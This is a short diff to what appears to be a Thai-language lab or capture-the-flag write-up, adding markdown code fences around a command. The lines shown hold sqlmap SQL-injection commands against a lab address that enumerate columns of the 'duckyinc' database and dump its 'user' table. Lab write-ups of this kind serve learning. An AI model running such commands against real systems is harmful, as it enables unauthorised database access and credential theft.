@@ -114,9 +114,9 @@ sqlmap -u "http://10.10.28.30/products/3*" -D duckyinc --columns
 
 ใช้คำสั่ง:
 
-bash
+```bash
 sqlmap -u "http://10.10.28.30/products/3*" -D duckyinc -T user --dump
-
+```
 
 ![Sqlmap](images/10.png)
 
